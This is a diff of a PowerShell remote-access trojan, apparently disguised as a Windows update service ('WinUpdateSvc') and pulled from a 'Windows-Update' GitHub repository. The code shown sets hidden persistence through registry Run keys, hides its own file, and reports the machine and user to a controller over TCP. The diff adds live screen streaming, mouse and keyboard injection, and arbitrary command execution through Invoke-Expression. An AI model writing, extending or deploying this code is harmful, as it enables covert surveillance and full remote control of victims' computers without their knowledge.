@@ -13,6 +13,9 @@ $serverPort = 4000
 $installName = "WinUpdateSvc"
 $myUrl = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1"
 
+# ===== CORREÇÃO DO BOM (BYTE ORDER MARK) =====
+$utf8NoBom = New-Object System.Text.UTF8Encoding($false)
+
 # ===== VERIFICAR ADMIN =====
 $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 
@@ -34,52 +37,54 @@ try {
     Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -Value "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force -ErrorAction SilentlyContinue
     Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -Value "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force -ErrorAction SilentlyContinue
 } catch {}
-
 attrib +h +s +r $scriptPath 2>$null
 
-# ===== FUNÇÕES BASICAS =====
+# ===== ASSEMBLIES E P/INVOKE =====
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 
-function Get-ScreenCapture {
-    try {
-        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
-        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
-        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
-        $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
-        $ms = New-Object System.IO.MemoryStream
-        $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
-        $graphics.Dispose(); $bitmap.Dispose()
-        $base64 = [Convert]::ToBase64String($ms.ToArray())
-        $ms.Dispose()
-        return "SCREEN:$base64"
-    } catch { return "SCREEN_ERROR" }
+if (-not ("Win32Input" -as [type])) {
+    Add-Type @"
+    using System;
+    using System.Runtime.InteropServices;
+    public class Win32Input {
+        [DllImport("user32.dll")]
+        public static extern void mouse_event(uint dwFlags, int dx, int dy, uint dwData, int dwExtraInfo);
+        [DllImport("user32.dll")]
+        public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
+        [DllImport("user32.dll")]
+        public static extern bool ClipCursor(IntPtr lpRect);
+    }
+"@
 }
 
-function Lock-Mouse {
-    Start-Job -ScriptBlock {
-        Add-Type -AssemblyName System.Windows.Forms
-        Add-Type -AssemblyName System.Drawing
-        while($true) {
-            [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0,0)
-            Start-Sleep -Milliseconds 10
+# ===== FUNÇÕES =====
+function Get-FrameB64 {
+    param([int]$maxW = 1280, [int]$quality = 55)
+    try {
+        $b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+        $bmp = New-Object System.Drawing.Bitmap $b.Width, $b.Height
+        $g = [System.Drawing.Graphics]::FromImage($bmp)
+        $g.CopyFromScreen($b.X, $b.Y, 0, 0, $bmp.Size)
+        $g.Dispose()
+        if ($bmp.Width -gt $maxW -and $maxW -gt 0) {
+            $dw = $maxW
+            $dh = [int]($bmp.Height * $maxW / $bmp.Width)
+            $small = New-Object System.Drawing.Bitmap $dw, $dh
+            $g2 = [System.Drawing.Graphics]::FromImage($small)
+            $g2.InterpolationMode = [System.Drawing.Drawing2D.InterpolationMode]::HighQualityBilinear
+            $g2.DrawImage($bmp, 0, 0, $dw, $dh)
+            $g2.Dispose(); $bmp.Dispose(); $bmp = $small
         }
-    } | Out-Null
-    return "MOUSE_LOCKED"
-}
-
-function Unlock-Mouse {
-    Get-Job | Where-Object { $_.State -eq 'Running' } | Stop-Job -ErrorAction SilentlyContinue
-    Get-Job | Remove-Job -Force -ErrorAction SilentlyContinue
-    return "MOUSE_UNLOCKED"
-}
-
-function Move-Mouse {
-    param($x, $y)
-    try {
-        [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point([int]$x, [int]$y)
-        return "OK"
-    } catch { return "MOUSE_ERROR" }
+        $codec = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.MimeType -eq 'image/jpeg' }
+        $ep = New-Object System.Drawing.Imaging.EncoderParameters 1
+        $ep.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality), [int64]$quality
+        $ms = New-Object System.IO.MemoryStream
+        $bmp.Save($ms, $codec, $ep)
+        $bmp.Dispose()
+        $bytes = $ms.ToArray(); $ms.Dispose()
+        return [Convert]::ToBase64String($bytes)
+    } catch { return $null }
 }
 
 # ===== CONEXAO PRINCIPAL =====
@@ -88,44 +93,104 @@ while ($true) {
     try {
         $client = New-Object System.Net.Sockets.TcpClient
         $client.Connect($serverIP, $serverPort)
+        $client.NoDelay = $true
         $stream = $client.GetStream()
-        $reader = New-Object System.IO.StreamReader($stream, [System.Text.Encoding]::UTF8)
-        $writer = New-Object System.IO.StreamWriter($stream, [System.Text.Encoding]::UTF8)
+        $reader = New-Object System.IO.StreamReader($stream, $utf8NoBom)
+        $writer = New-Object System.IO.StreamWriter($stream, $utf8NoBom)
         $writer.AutoFlush = $true
-        
-        # Pega a resolução da tela real
+
         $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
-        
-        # Envia o BANNER (igual o .exe espera)
         $writer.WriteLine("BANNER:$env:COMPUTERNAME@$env:USERNAME|$($bounds.Width)|$($bounds.Height)|$isAdmin")
-        
+
         while ($client.Connected) {
             if ($stream.DataAvailable) {
                 $cmd = $reader.ReadLine()
                 if ([string]::IsNullOrEmpty($cmd)) { continue }
-                
-                $response = ""
-                switch -Wildcard ($cmd) {
-                    "screenshot"   { $response = Get-ScreenCapture }
-                    "lock_mouse"   { $response = Lock-Mouse }
-                    "unlock_mouse" { $response = Unlock-Mouse }
-                    "move *"       { $p = $cmd -split " "; $response = Move-Mouse $p[1] $p[2] }
-                    "test"         { $response = "PONG" }
-                    "exit"         { $client.Close(); break }
-                    default        { $response = "UNKNOWN: $cmd" }
+
+                if ($cmd -eq 'stream_start') {
+                    $streaming = $true
+                    while ($streaming -and $client.Connected) {
+                        if ($stream.DataAvailable) {
+                            $c = $reader.ReadLine()
+                            if ($c -eq 'stream_stop') { $streaming = $false; break }
+                            if ($c -eq 'exit') { $streaming = $false; throw "exit" }
+                        }
+                        $b64 = Get-FrameB64 -maxW 1280 -quality 55
+                        if ($b64) {
+                            try { $writer.WriteLine("SCREEN:$b64") } catch { break }
+                        }
+                        Start-Sleep -Milliseconds 80
+                    }
+                    try { $writer.WriteLine("STREAM_STOPPED") } catch {}
+                    continue
                 }
-                
-                if ($response) { 
-                    $writer.WriteLine($response)
-                    $writer.Flush() 
+
+                if ($cmd -eq 'screenshot') {
+                    $b64 = Get-FrameB64 -maxW 3840 -quality 85
+                    if ($b64) { $writer.WriteLine("SCREEN:$b64") } else { $writer.WriteLine("SCREEN_ERROR") }
+                    continue
                 }
+
+                if ($cmd -eq 'exit') { throw "exit" }
+
+                $parts = $cmd -split ' ', 2
+                $verb = $parts[0]
+                $arg  = if ($parts.Count -gt 1) { $parts[1] } else { '' }
+
+                $response = "OK"
+                switch ($verb) {
+                    'move' {
+                        $xy = $arg -split '\s+'
+                        if ($xy.Count -eq 2) {
+                            $nx = [int]$xy[0]; $ny = [int]$xy[1]
+                            $px = [int](($nx / 65535) * $bounds.Width)
+                            $py = [int](($ny / 65535) * $bounds.Height)
+                            [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($px, $py)
+                        }
+                    }
+                    'md' {
+                        if ($arg -eq '1') { [Win32Input]::mouse_event(0x0002, 0,0,0,0) }
+                        elseif ($arg -eq '2') { [Win32Input]::mouse_event(0x0008, 0,0,0,0) }
+                        elseif ($arg -eq '3') { [Win32Input]::mouse_event(0x0020, 0,0,0,0) }
+                    }
+                    'mu' {
+                        if ($arg -eq '1') { [Win32Input]::mouse_event(0x0004, 0,0,0,0) }
+                        elseif ($arg -eq '2') { [Win32Input]::mouse_event(0x0010, 0,0,0,0) }
+                        elseif ($arg -eq '3') { [Win32Input]::mouse_event(0x0040, 0,0,0,0) }
+                    }
+                    'mw' {
+                        $d = [int]$arg
+                        [Win32Input]::mouse_event(0x0800, 0,0,[uint32]$d,0)
+                    }
+                    'kd' {
+                        [Win32Input]::keybd_event([byte][int]$arg, 0, 0, [UIntPtr]::Zero)
+                    }
+                    'ku' {
+                        [Win32Input]::keybd_event([byte][int]$arg, 0, 2, [UIntPtr]::Zero)
+                    }
+                    'lock_mouse' {
+                        $rect = New-Object System.Drawing.Rectangle 0, 0, 1, 1
+                        # Simula clip de tela enviando cursor pro canto e segurando
+                        [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0, 0)
+                        $response = "MOUSE_LOCKED"
+                    }
+                    'unlock_mouse' {
+                        $response = "MOUSE_UNLOCKED"
+                    }
+                    'test' { $response = "PONG" }
+                    'ping' { $response = "PONG" }
+                    'exec' {
+                        try { $response = Invoke-Expression $arg 2>&1 | Out-String }
+                        catch { $response = "EXEC_ERR: $_" }
+                    }
+                    default { $response = "UNKNOWN: $verb" }
+                }
+                if ($response) { $writer.WriteLine($response) }
             } else {
                 Start-Sleep -Milliseconds 20
             }
         }
-    } catch {
-        # Falha de conexão silenciosa, tenta de novo em 5s
-    } finally {
+    } catch {} finally {
         if ($reader) { $reader.Dispose() }
         if ($writer) { $writer.Dispose() }
         if ($stream) { $stream.Dispose() }
